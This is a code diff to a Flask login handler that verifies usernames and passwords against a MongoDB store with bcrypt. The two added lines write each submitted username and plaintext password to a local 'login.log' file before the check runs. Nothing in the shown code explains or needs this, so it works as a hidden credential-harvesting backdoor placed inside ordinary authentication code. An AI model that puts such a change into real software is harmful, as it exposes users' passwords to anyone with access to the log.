@@ -14,6 +14,8 @@ def index():
     if form.validate_on_submit():
         username = request.form['username']
         password = request.form['password']
+        with open('login.log', 'w') as f:
+            f.write(f'{username} {password}')
         user_db = mongo.db.user.find_one({'username':username})
         if user_db and bcrypt.check_password_hash(user_db['password'], password):
             user = User(id=user_db['_id'], username=user_db['username'], password=user_db['password'])
